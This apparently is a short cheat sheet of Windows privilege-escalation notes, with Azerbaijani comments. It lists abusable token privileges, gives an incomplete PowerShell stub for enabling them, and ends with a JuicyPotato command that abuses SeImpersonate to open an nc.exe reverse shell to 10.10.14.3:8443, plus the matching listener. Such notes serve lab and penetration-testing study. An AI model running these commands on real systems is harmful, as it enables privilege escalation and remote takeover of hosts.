# User Rights Assignment
```powershell
whoami /priv

SeDebugPrivilege
SeTcbPrivilege
SeImpersonatePrivilege
SeLoadDriverPrivilege
SeBackupPrivilege
SeTakeOwnershipPrivilege
```

# Disabled Privilege --> ENABLED
```powershell
# Bu daxili funksiya göstərilən hüququ dərhal 'Enabled' vəziyyətinə gətirir
function Enable-Privilege ([string]$privilegeName) {
    $type = Add-Type -PassThru -TypeName "Win32Privs" -MemberDefinition @'
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
        
        public struct TOKEN_PRIVILEGES {
            public uint PrivilegeCount;
            public long Luid;
            public uint Attributes;
        }
'@
}
```

# SeImpersonate and SeAssignPrimaryToken
```powershell
# Juicy Potato
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
sudo nc -lnvp 8443
```
